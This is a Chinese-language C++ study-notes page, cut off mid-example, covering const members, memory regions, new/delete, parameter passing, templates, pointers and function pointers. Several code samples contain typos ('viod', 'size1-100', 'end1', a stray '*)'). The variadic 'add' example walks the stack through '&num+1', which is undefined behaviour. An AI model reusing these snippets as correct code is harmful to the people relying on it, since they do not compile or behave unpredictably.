src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220627110937750.png" alt="image-20220627110937750"></p></li></ul><h4 id="cosnt在类中的应用"><a href="#cosnt在类中的应用" class="headerlink" title="cosnt在类中的应用"></a>cosnt在类中的应用</h4><p>const只能作用于成员函数，不能作用于全局函数。</p><ul><li><p>const成员函数</p><p>确保该成员函数可作用于const对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">base</span>&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>func1默认会有对象的this指针作为形参。func2声明时末尾的const使得this所指向的对象也为const，这使得该函数可作用于const对象。因为<strong>const对象只能调用其const成员函数，无法调用其非const成员函数</strong>。</p><p>非const对象可以调用所有成员函数。</p></li><li><p>const数据成员</p><p>常量数据成员（常量成员变量）&#x3D;&#x3D;必须在构造函数的成员初始化列表中进行初始化&#x3D;&#x3D;，并且必须有构造函数。<strong>因为const 数据成员只在某个对象生存期内是常量，而对于整个类而言却是可变的</strong>。而类可以创建多个对象，不同的对象其const数据成员的值可以不同。所以不能在类的声明中初始化const数据成员，因为类的对象没被创建时，编译器不知道const数据成员的值是什么。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Thing</span>&#123;</span><br><span class="line"><span class="built_in">Thing</span>():<span class="built_in">valueB</span>(<span class="number">1</span>)&#123;*&#125;)  <span class="comment">// 使用构造函数初始化列表对const数据成员valueB进行初始化</span></span><br><span class="line"><span class="type">int</span> valueA;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> valueB;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;例外：当const整型数据成员同时被声明为static时，可以使用外部初始化。&#x3D;&#x3D;因为static使得该数据成员为类所有，而不是对象，只能在类外进行定义。</p><p>如果想要建立在整个类中都恒定的常量，除了使用上面的const static外，还可以使用枚举常量实现，如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Test</span>():<span class="built_in">a</span>(<span class="number">0</span>) &#123;&#125;    <span class="comment">// 在构造函数初始化列表中对const数据成员a进行初始化</span></span><br><span class="line"><span class="keyword">enum</span> &#123;size1<span class="number">-100</span>, size2=<span class="number">200</span>&#125;;</span><br><span class="line"><span class="keyword">private</span> :</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a;   <span class="comment">//只能在构造函数初始化列表中初始化</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> b;  <span class="comment">//在类的实现文件中（即类定义体的外部）定义并初始化</span></span><br><span class="line">    <span class="type">const</span> <span class="type">static</span> <span class="type">int</span> c;  <span class="comment">/*与static const int c; 相同，c为整型，故也可在此处初始化，但仍需在类定义体外进行定义，注意c为非整型时，不能在此处初始化，整型包括char、short、int、long*/</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Test::b=<span class="number">0</span>;         <span class="comment">/* static成员变量不能在构造函数初始化列表中初始化，因为它不属于某个对象*/</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> Test::c=<span class="number">0</span>;   <span class="comment">/*注意:给const static成员变量赋值时，不需要加static修饰符，但要加const*/</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-5-内存管理与释放"><a href="#5-5-内存管理与释放" class="headerlink" title="5.5 内存管理与释放"></a>5.5 内存管理与释放</h3><p>一个C&#x2F;C+ +的程序，用户使用的内存主要分为以下几个部分：</p><ol><li><p>堆</p><p><strong>手动分配和释放</strong>，与数据结构中的堆不是同一个概念，分配方式类似链表。一般速度较慢，容易产生内存碎片，不过用起来方便。C中由malloc、free操作，C++中由new、delete操作。若不手动释放，则在程序结束后由系统释放。malloc与free是C&#x2F;C++语言的<strong>标准库函数</strong>，new&#x2F;delete 是C++的<strong>运算符</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* p1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">10</span>);  <span class="comment">// 申请10个字节空间，由free释放</span></span><br><span class="line"><span class="type">char</span>* p2 = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">10</span>];        <span class="comment">// 由delete[]释放</span></span><br></pre></td></tr></table></figure><p>但是注意指针p1、p2 本身是在栈中的，它们指向在堆上分配的内存。**回收用new[]分配的一组对象的内存空间时用delete[]**。</p></li><li><p>栈区(stack)</p><p>由编译器<strong>自动分配和释放</strong>，存放函数的参数值、局部变量的值等。操作方式类似数据结构中的栈，速度较快。</p></li><li><p>全局（静态）存储区</p><p><strong>存放全局变量和静态变量</strong>。初始化的全局变量和静态变量存放在<strong>DATA段</strong>，未初始化的存放在<strong>BSS段</strong>。程序结束后由系统释放，</p><p>BSS段的特点是在程序执行之前BSS段会自动清0。所以<strong>未初始化的全局变量和静态变量在程序执行前已经为0</strong>。</p></li><li><p>文字常量区：存储常量字符串。程序结束后由系统释放。</p></li><li><p>程序代码区：存放函数体的二进制代码。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220609144830856.png" alt="image-20220609144830856"></p></li></ol><h4 id="C语言内存操作函数"><a href="#C语言内存操作函数" class="headerlink" title="C语言内存操作函数"></a>C语言内存操作函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetMemory</span><span class="params">(<span class="type">char</span> *p)</span></span>&#123;</span><br><span class="line">p=(<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">11</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> *str=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="built_in">GetMemory</span>(str);</span><br><span class="line"><span class="built_in">strcpy</span>(str, <span class="string">&quot;hello word&quot;</span>);  <span class="comment">// 运行错误</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述程序会运行错误。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220627144556450.png" alt="image-20220627144556450"></p><p>开始时，str是指向文字常量区的指针，GetMemory函数并不会为str新分配空间。如上图所示，函数调用传参时，str和形参的p虽然指向相同，但它们自身的地址不同，是两个不同的变量。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220627144623164.png" alt="image-20220627144623164"></p><p>如上图所示，p在执行malloc之后就指向不同的位置了，随后因为p是局部变量而被释放，malloc的空间没有free，成为无法引用的空间了。</p><p>str一直指向的是”hello”的文字常量区，而文字常量是不允许修改的，故调用strcpy时会出错。</p><h4 id="C-内存管理"><a href="#C-内存管理" class="headerlink" title="C++内存管理"></a>C++内存管理</h4><p>动态创建对象如果不是显示初始化（如string()），那么对于类类型的对象，用该类默认构造函数初始化；而内置类型的对象则无法初始化，如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string *ps=<span class="keyword">new</span> string;    <span class="comment">//调用默认构造函数初始化</span></span><br><span class="line">string *ps=<span class="keyword">new</span> <span class="built_in">string</span>();<span class="comment">//调用默认构造函数初始化</span></span><br><span class="line"><span class="type">int</span> *pi=<span class="keyword">new</span> <span class="type">int</span>;<span class="comment">// pi指向的内容未初始化</span></span><br><span class="line"><span class="type">int</span> *pi=<span class="keyword">new</span> <span class="built_in">int</span>();  <span class="comment">// 显式初始化，pi指向一个初始化为0的int值</span></span><br></pre></td></tr></table></figure><p>可见对于提供了默认构造函数的类类型(如string)，没有必要对其对象进行显式初始化。因为无论程序是明确地不初始化还是要求进行初始化，都会自动调用其默认构造函数初始化该对象。</p><p>而对于内置类型或没有定义默认构造函数的类型，采用不同初始化方式则有显著的差别。内置类型对象或未提供默认构造函数的类类型对象必须显式初始化。</p><p><strong>new的执行过程是</strong>：首先，调用名为operator new的标准库函数，<u>分配足够大的原始未类型化的内存</u>，以保存指定类型的一个对象；接下来，<u>运行该类型的一个构造函数</u>，用指定初始化式构造对象；最后，<u>返回指向新分配并构造的对象的指针</u>。</p><p><strong>delete的执行过程是</strong>：首先，对sp指向的对象<u>运行适当的析构函数</u>；然后，通过调用名为operator delete的标准库函数<u>释放该对象所用内存</u>。</p><p><strong>malloc&#x2F;free与new&#x2F;delete的区别</strong>：</p><ul><li>malloc&#x2F;free是C&#x2F;C++语言的标准库函数，new&#x2F;delete是C++运算符</li><li>new自动计算需要分配的空间，而malloc需要手工计算字节数</li><li>new是类型安全的，而malloc则不是</li><li><strong><u>new调用operator new分配足够的空间，并调用相关对象的构造函数，而malloc只负责分配空间，不能调用构造函数；delete将调用实例的析构函数，然后调用operator delete，以释放该实例占用的控件，而free只负责释放空间，不能调用析构函数</u></strong></li><li>malloc&#x2F;free需要库文件支持，new&#x2F;delete不需要</li></ul><h2 id="6-函数"><a href="#6-函数" class="headerlink" title="6. 函数"></a>6. 函数</h2><p>一般的来说，函数是可以返回局部变量的。 局部变量的作用域只在函数内部，在函数返回后，局部变量的内存已经释放了。因此，<strong>如果函数返回的是局部变量的值，不涉及地址，程序不会出错。但是如果返回的是局部变量的地址(指针)的话，程序运行后会出错。</strong>因为函数只是把指针复制后返回了，但是指针指向的内容已经被释放了，这样指针指向的内容就是不可预料的内容，调用就会出错。<strong>准确的来说，函数不能通过返回指向栈内存的指针(注意这里指的是栈，返回指向堆内存的指针是可以的。</strong></p><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>形参和实参用作数据传送。形参出现在函数定义中，仅在函数体中可以使用。实参出现在主调函数中，进入被调函数后，实参变量也不能使用。<strong>主调函数只是把实参的值传送给被调函数的形参，只有引用才会改变实参</strong>。</p><p>C语言的函数参数传递可以分为传递值和传递地址（指针）。C++中可以分为传递值、传递指针、传递引用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">viod <span class="title">f1</span><span class="params">(<span class="type">int</span>* m, <span class="type">long</span>&amp; n)</span> </span>;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">long</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">f1</span>(&amp;a, b);   <span class="comment">// m为指针传递，n为引用传递</span></span><br></pre></td></tr></table></figure><p>给函数传递实参遵循变量初始化的规则。非引用类型的形参以相应实参的副本(值)初始化，若是对象还会调用拷贝构造函数。<strong>对(非引用)形参的任何修改仅作用于局部副本，并不影响实参本身</strong>。为了避免传递副本的开销，可将形参指定为引用类型，这时内存中不会产生实参的副本。<strong>对引用形参的任何修改会直接影响实参本身</strong>。应将不需要修改相应实参的引用形参定义为const引用。</p><p>要使引用pr代表变量<code>char *p</code>， 则pr的初始化语句为<code>char* &amp;pr=p;</code>。</p><p>使用指针和解引用来交换变量的值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> *p1,<span class="type">int</span> *p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 交换指针所指向地址的内容</span></span><br><span class="line"><span class="type">int</span> t=*p1;</span><br><span class="line">*p1=*p2;</span><br><span class="line">*p2=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> b=<span class="number">20</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;a,&amp;b);</span><br></pre></td></tr></table></figure><h3 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h3><p>通常编译时，调用内联函数的地方，将不进行函数调用，而是<strong>使用函数体替换调用处的函数名</strong>，形式类似宏替换，这种替换称为内联扩展。</p><p>内联扩展可以消除函数调用时的时间开销。将函数指定为inline函数，通常就是将它在程序中每个调用点上“内联地”展开。</p><p>一般来说，内联机制适用于优化小的、只有几行的而且经常被调用的函数。大多数的编译器都不支持递归函数的内联。</p><ul><li><p>成员函数成为内联函数<br>在类中定义的成员函数全部默认为内联函数，可以显式加上inline标识符，或者不加。在类中声明的成员函数，如果加了inline, 则其为内联函数；如果没加inline，而在类外定义该成员函数时加了inline，该成员函数也为内联函数。</p></li><li><p>普通函数成为内联函数<br>在普通函数声明或定义前加inline使其成为内联函数。</p></li></ul><p><strong>注意：宏定义与内联函数的区别</strong></p><p>首先，宏定义是在预处理阶段进行代码替换，而内联函数是在编译阶段插入代码；</p><p>其次， 宏定义没有类型检查，而内联函数有类型检查。</p><h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><ul><li>默认参数只可以在函数声明中设定一次，只有在无函数声明时，才可以在函数定义中设定。</li><li>默认参数定义的顺序为自右到左。即如果一个参数设定了默认值，其右边的参数都要有默认值。</li><li>默认值可以是全局变量、全局常量，甚至一个函数，但不可以是局部变量。因为默认参数是在编译时确定的，而局部变量位置与默认值在编译时无法确定。</li></ul><p>接受可变参数的函数实现多个数的相加：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> num, ...)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>* p=(<span class="type">int</span>*)&amp;num+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(;index&lt;num;++index)&#123;</span><br><span class="line">        sum += *p++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>, j=<span class="number">2</span>, k=<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">add</span>(<span class="number">3</span>,i,j,k);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>进行函数重载时，要求同名函数在参数个数上不同，或者参数类型上不同。</p><p>操作符重载，本质上也是函数重载，它大大丰富了已有操作符的含义，方便使用，如+可用于连接字符串等。</p><h3 id="函数模板与泛型"><a href="#函数模板与泛型" class="headerlink" title="函数模板与泛型"></a>函数模板与泛型</h3><p>在泛型编程中，我们所编写的类和函数能够多态地用于跨越编译时不相关的类型。一个类或一个函数可以用来操纵多种类型的对象。标准库中的容器、迭代器和算法是很好的泛型编程的例子。标准库用独立于类型的方式定义每个容器、迭代器和算法，因此几乎可以在任意类型上使用标准库的类和函数。</p><h4 id="函数模板"><a href="#函数模板" class="headerlink" title="函数模板"></a>函数模板</h4><p>在C++中，模板是泛型编程的基础。模板是创建类或函数的蓝图或公式。</p><p>模板定义以关键字template开始，后接模板形参表，模板形参表是用尖括号括住的一个或多个模板形参的列表，形参之间以<strong>逗号</strong>分隔。模板形参表不能为空。同样，模板形参表示可以在类或函数的定义中使用的类型或值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;  <span class="comment">// 关键字使用class或者typename</span></span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(T x, T y)</span></span>&#123;       <span class="comment">// T表示哪个实际类型由编译器根据所用的函数参数而确定</span></span><br><span class="line"><span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220627211022576.png" alt="image-20220627211022576"></p><h4 id="类模板"><a href="#类模板" class="headerlink" title="类模板"></a>类模板</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">Type</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="built_in">Queue</span>();        <span class="comment">// default constructor</span></span><br><span class="line">        <span class="function">Type &amp;<span class="title">front</span> <span class="params">()</span></span>; <span class="comment">// return element from head of Queue</span></span><br><span class="line">        <span class="function"><span class="type">const</span> Type &amp;<span class="title">front</span> <span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">push</span> <span class="params">(<span class="type">const</span> Type &amp;)</span></span>; <span class="comment">// add element to back of Queue</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>; <span class="comment">// remove element from head of Queue</span></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="type">const</span></span>; / <span class="literal">true</span> <span class="keyword">if</span> no elements in the Queue</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// ……</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用类模板时，必须为模板形参显式指定实参<code>Queue&lt;int&gt; qi;</code>编译器使用实参来实例化这个类的特定类型版本，即编译器用用户提供的实际特定类型（比如int）代替Type，重新编写Queue。</p><h3 id="函数的递归"><a href="#函数的递归" class="headerlink" title="函数的递归"></a>函数的递归</h3><p>必须注意递归模型不能是循环定义的，其必须满足下面的两个条件：</p><ul><li>递归表达式(递归体)</li><li>边界条件(递归出口)</li></ul><p>递归的精髓在于能否将原始问题转换为属性相同但规模较小的问题。</p><p>在递归调用的过程中，系统为每一层的返回点、 局部变量、传入实参等开辟了递归工作栈来进行数据存储，递归次数过多容易造成栈溢出等。而其效率不高的原因是递归调用过程中包含很多重复的计算。</p><h2 id="7-指针与引用"><a href="#7-指针与引用" class="headerlink" title="7. 指针与引用"></a>7. 指针与引用</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><h4 id="指针的声明"><a href="#指针的声明" class="headerlink" title="指针的声明"></a>指针的声明</h4><p>一个有效的指针必然是以下三种状态之一：</p><p>保存一个特定对象的地址；指向某个对象后面的另一对象；或者是0值。若指针保存0值，表明它不指向任何对象。未初始化的指针是无效的，直到给该指针赋值后，才可使用它。</p><p>特别的，对于指针变量：</p><p><code>*p++</code>  实现了先输出p所指地址处的数据值，然后指针后移到下一指针处；</p><p><code>*++p</code>  实现了先将指针指向后移，再输出此时指针所指处的数据的值；</p><p><code>(*p)++</code> 实现的是将指针p所指向地址处的数据值（比如300）输出后再自增1（得到301）；</p><h4 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h4><p>C语言允许用typedef说明一种新类型名，来代替已有类型名，形式为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> 类型名 标识符;</span><br></pre></td></tr></table></figure><p>typedef并未产生新的数据类型，它的作用仅仅是<strong>给已存在的类型名起一个“别名”</strong>，且原有类型名依然有效。</p><p>例1: <code>typedef char* String_t;</code>和<code>#define string_d char \*</code>这两句在使用上有什么区别?(2012●腾讯)</p><p>解答：前者声明一个类型的别名，在编译时处理，有类型检查；后者是-一个简单的替换，在预编译时处理，无类型检查。从使用上来说，<code>String_t a, b;</code>“中a和b都是char*类型的，但<code>String _d a, b;</code>中只有a是char*类型的，b是char型的。</p><h4 id="void-指针"><a href="#void-指针" class="headerlink" title="void* 指针"></a>void* 指针</h4><p>void* 指针是一种特殊类型的指针，其可以保存任何类型对象的地址。</p><p>void*表明该指针与一地址有关，但是不清楚此地址上的对象的类型，故仅支持几种有限的操作：</p><ul><li>与另一个指针进行比较</li><li>向函数传递void*指针或从函数返回void* 指针</li><li>给另一个void*指针赋值。</li></ul><p>不允许使用void*指针操纵它所指向的对象。</p><h4 id="指向指针的指针"><a href="#指向指针的指针" class="headerlink" title="指向指针的指针"></a>指向指针的指针</h4><p>指针本身也是占用内存空间的存放其值的，所以也可用指针指向。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ival=<span class="number">1024</span>;</span><br><span class="line"><span class="type">int</span> *pi=&amp;ival;</span><br><span class="line"><span class="type">int</span> **ppi=&amp;pi;  <span class="comment">// 指向指针的指针</span></span><br></pre></td></tr></table></figure><p>32位系统下，有如下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span>* (*a)[<span class="number">3</span>][<span class="number">6</span>];    <span class="comment">// (*a)[3][6]表示数组指针，a指向一个二维数组，而数组的元素是double*类型</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">sizeof</span>(a)&lt;&lt;endl; <span class="comment">// 4，指针占用4个字节</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">sizeof</span>(*a)&lt;&lt;endl;  <span class="comment">// 72，二维数组有18个元素，每个元素（元素类型为指针）占4个字节</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">sizeof</span>(**a)&lt;&lt;endl; <span class="comment">// 24，*a为二维数组，*a[0]就是**a，即第一个元素，内容为一维数组，6*4得24</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">sizeof</span>(***a)&lt;&lt;endl;  <span class="comment">// 4，**a为一个一维数组，**a[0]就是***a，类型为double*</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">sizeof</span>(****a)&lt;&lt;end1; <span class="comment">// 8，***a为double*类型，所以****a为取double*指针指向地址的内容，存储大小为double的大小，即8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><p>函数指针指向某个特定的函数类型，函数类型由其返回类型以及形参决定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数指针变量的声明，类型为bool (*)(const string &amp;, const string &amp;)</span></span><br><span class="line"><span class="built_in">bool</span> (*pf)(<span class="type">const</span> string &amp;, <span class="type">const</span> string &amp;);</span><br></pre></td></tr></table></figure><p>这个语句将pf声明为指向函数的指针，它所指向的函数带有两个const string&amp; 类型的形参和bool类型的返回值。</p><p>&#x3D;&#x3D;注意：*pf两侧的圆括号是必须的。且形参只需写类型名&#x3D;&#x3D;</p><p>由于函数指针类型冗长，所以可以使用typedef简化函数指针的定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*cmpFcn)</span><span class="params">(<span class="type">const</span> string &amp;，<span class="type">const</span> string &amp;)</span></span>;</span><br><span class="line">cmpFcn pf1=<span class="number">0</span>;  <span class="comment">// 定义一个空的函数指针，使用前一行typedef定义的cmpFcn函数指针类型</span></span><br></pre></td></tr></table></figure><p>在要使用这种函数指针类型时，只需直接使用cmpFcn即可，不必每次都把整个类型声明全部写出来。</p><p>在引用函数名但又没有调用该函数时，函数名将被自动解释为指向函数的指针，等效于在函数名上应用取地址符。可使用函数名对函数指针做初始化或赋值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">lengthCompare</span><span class="params">(<span class="type">const</span> string &amp;，<span class="type">const</span> string &amp;)</span></span>;   <span class="comment">// 有一同返回类型以及形参的函数声明</span></span><br><span class="line">cmpFcn pf2=lengthCompare;   <span class="comment">// 使用该函数名初始化函数指针</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;注意：函数指针只能通过同类型的函数或函数指针或0值常量表达式进行初始化或赋值。&#x3D;&#x3D;指向不同函数类型的指针之间不存在转换。将函数指针初始化为0，表示该指针不指向任何函数。</p><ul><li><p><strong>函数指针的使用</strong></p><p>指向函数的指针可用于调用它所指向的函数。可以不需要使用解引用操作符，直接通过指针调用函数，若有：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*cmpFcn)</span><span class="params">(<span class="type">const</span> string &amp;，<span class="type">const</span> string &amp;)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">lengthCompare</span><span class="params">(<span class="type">const</span> string &amp;，<span class="type">const</span> string &amp;)</span></span>;</span><br></pre></td></tr></table></figure><p>则：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmpFcn pf=lengthCompare;</span><br><span class="line"><span class="built_in">lengthCompare</span>(<span class="string">&quot;hi&quot;</span>,<span class="string">&quot;bye&quot;</span>);  <span class="comment">// 使用函数名</span></span><br><span class="line"><span class="built_in">pf</span>(<span class="string">&quot;hi&quot;</span>,<span class="string">&quot;bye&quot;</span>);             <span class="comment">// 使用函数指针，未使用*</span></span><br><span class="line">(*pf)(<span class="string">&quot;hi&quot;</span>,<span class="string">&quot;bye&quot;</span>);          <span class="comment">// 使用函数指针，使用*</span></span><br></pre></td></tr></table></figure></li><li><p><strong>函数指针形参</strong><br>函数的形参可以是指向函数的指针。这种形参可以用以下两种形式编写:<br><code>void useBigger (const string &amp;，const string &amp;, bool (const string &amp;，const string &amp;));</code><br>上述定义等价于:<br><code>void useBigger (const string &amp; const string &amp;, bool (*) (const string &amp;, const string&amp;));</code></p></li><li><p><strong>返回指向函数的指针</strong></p><p>函数可以返回指向函数的指针：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> (*<span class="built_in">ff</span>(<span class="type">int</span>))(<span class="type">int</span>*, <span class="type">int</span>);   <span class="comment">// 声明返回类型为函数指针的函数</span></span><br></pre></td></tr></table></figure><p>这个语句中，函数为<code>ff(int)</code>，其返回值类型为<code>int (*)(int*, int)</code>的函数指针。这样子比较难理解，使用typedef更简明：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*PF)</span><span class="params">(<span class="type">int</span>*, <span 